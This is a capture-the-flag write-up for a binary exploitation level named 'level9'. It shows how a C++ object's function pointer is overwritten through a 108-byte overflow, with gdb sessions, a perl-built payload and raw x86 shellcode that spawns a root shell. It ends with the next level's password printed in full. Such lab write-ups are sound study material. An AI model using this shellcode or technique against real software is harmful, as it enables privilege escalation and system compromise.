# level9

In this level, we have a c++ program with an object.
The first step is to all understand and all convert to a pseudo c++ code (see source).

We can see at main+159: `call edx`. The goal is to change the edx pointer (by default `edx = refObj2`).

We can fill a str with `setAnnotation` function. So we will add a shellcode in the string of Obj using `setAnnotation` function and set the edx pointer to jump on `obj1._str`.

```bash
[COMPUTER]
> ./pattern.py create 200
AAA~AAA}AAA|AAA{AAAzAAAyAAAxAAAwAAAvAAAuAAAtAAAsAAArAAAqAAApAAAoAAAnAAAmAAAlAAAkAAAjAAAiAAAhAAAgAAAfAAAeAAAdAAAcAAAbAAAaAAA_AAA^AAA]AAA[AAA@AAA?AAA>AAA=AAA<AAA;AAA:AAA9AAA8AAA7AAA6AAA5AAA4AAA3AAA2AAA1
> ./pattern.py search AAAc
found at offset: 108

[VM]
> gdb level9
(gdb) $ b *main+142
(gdb) $ run 'AAA~AAA}AAA|AAA{AAAzAAAyAAAxAAAwAAAvAAAuAAAtAAAsAAArAAAqAAApAAAoAAAnAAAmAAAlAAAkAAAjAAAiAAAhAAAgAAAfAAAeAAAdAAAcAAAbAAAaAAA_AAA^AAA]AAA[AAA@AAA?AAA>AAA=AAA<AAA;AAA:AAA9AAA8AAA7AAA6AAA5AAA4AAA3AAA2AAA1'
...
# we see that $eax = "AAAc"
# searching for "AAAc" pattern with the python script -> offset = 108
```
So we can call the function at address `argv[1] + 108`. We can for example put the address of `obj1._str`.
```bash
> gdb level9
(gdb) $ b memcpy@plt
(gdb) $ r AAAA
(gdb) $ x $esp+0x4
0x0804a00c  # address of obj1._str
```

Let's try with this:
```bash
> gdb level9
(gdb) $ run `perl -e 'print "A"x108 . "\x0c\xa0\x04\x08"'`
... segfault: Invalid $PC address: 0x41414141
# so we know that we try to exec the code at _str address
```

Now, all we need is to put a pointer on _str address (the code will jump from this address), the pointer is only a few bytes after and we can put the shellcode.
```bash
> ./level9 `perl -e 'print "\x10\xa0\x04\x08\x90\x90\x90\x90\x90\x90\x90\x31\xdb\x89\xd8\xb0\x17\xcd\x80\x31\xdb\x89\xd8\xb0\x2e\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80" . "A"x56 . "\x0c\xa0\x04\x08"'`
$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```

```
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```